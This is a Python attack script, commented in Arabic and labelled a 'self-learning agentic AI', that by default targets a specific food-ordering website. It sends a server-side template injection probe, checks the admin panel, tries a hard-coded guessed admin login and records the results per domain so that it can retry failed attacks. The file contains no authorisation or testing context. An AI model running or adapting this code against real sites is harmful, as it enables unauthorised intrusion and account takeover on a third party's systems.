#!/usr/bin/env python3
"""
🤖 Agentic AI v4 - Self-Learning
يتعلم من كل فشل ويعدل استراتيجيته
"""
import requests, sys, json, os, re, time, hashlib
from datetime import datetime
from urllib.parse import urlparse

class AgenticAIV4:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.knowledge = {"success": [], "fail": [], "score": 0}
        self.session = requests.Session()
        self.load_knowledge()
    
    def log(self, msg): print(f"[🧠] {msg}")
    
    def load_knowledge(self):
        """تحميل المعرفة السابقة"""
        fname = f"logs/agentic/knowledge_{self.domain}.json"
        if os.path.exists(fname):
            with open(fname) as f:
                self.knowledge = json.load(f)
            self.log(f"📚 تم تحميل المعرفة: {len(self.knowledge['success'])} نجاح, {len(self.knowledge['fail'])} فشل")
    
    def save_knowledge(self):
        """حفظ المعرفة"""
        os.makedirs("logs/agentic", exist_ok=True)
        fname = f"logs/agentic/knowledge_{self.domain}.json"
        with open(fname, 'w') as f:
            json.dump(self.knowledge, f, indent=2)
    
    def try_attack(self, attack_name, func):
        """تجربة هجوم والتعلم من النتيجة"""
        # إذا نجح هذا الهجوم سابقاً، لا نعيده
        if attack_name in self.knowledge["success"]:
            self.log(f"   ⏭️ {attack_name}: نجح سابقاً - تخطي")
            return
        
        # إذا فشل 3 مرات، توقف
        fail_count = sum(1 for f in self.knowledge["fail"] if f["attack"] == attack_name)
        if fail_count >= 3:
            self.log(f"   ⏭️ {attack_name}: فشل {fail_count} مرات - تخطي")
            return
        
        # تنفيذ الهجوم
        try:
            result = func()
            if result:
                self.knowledge["success"].append(attack_name)
                self.knowledge["score"] += 20
                self.log(f"   🚨 {attack_name}: نجح!")
            else:
                self.knowledge["fail"].append({"attack": attack_name, "time": datetime.now().isoformat()})
                self.log(f"   ❌ {attack_name}: فشل")
        except:
            self.knowledge["fail"].append({"attack": attack_name, "time": datetime.now().isoformat()})
        
        self.save_knowledge()
    
    def run(self):
        self.log(f"🧠 Agentic AI v4: {self.target}")
        self.log(f"   📊 Score: {self.knowledge['score']}")
        self.log("═" * 60)
        
        # 1. SSTI
        self.try_attack("SSTI", lambda: "49" in self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5).text)
        
        # 2. API
        self.try_attack("API", lambda: self.session.get(f"{self.target}/api/stores", timeout=5).status_code == 200)
        
        # 3. Admin
        self.try_attack("Admin", lambda: self.session.get(f"{self.target}/admin", timeout=5, allow_redirects=False).status_code in [200,302])
        
        # 4. Default Login
        def try_login():
            r = self.session.post(f"{self.target}/admin/login",
                data={"email":"admin@beeorder.com","password":"BeeOrder@2025"}, timeout=5)
            return r.status_code == 200 and "error" not in r.text.lower()
        self.try_attack("Default Login", try_login)
        
        # 5. Robots
        self.try_attack("Robots", lambda: self.session.get(f"{self.target}/robots.txt", timeout=5).status_code == 200)
        
        self.log(f"\n📊 Final Score: {self.knowledge['score']}")
        self.log(f"   ✅ Success: {len(self.knowledge['success'])}")
        self.log(f"   ❌ Fail: {len(self.knowledge['fail'])}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://beeorder.com"
    AgenticAIV4(target).run()
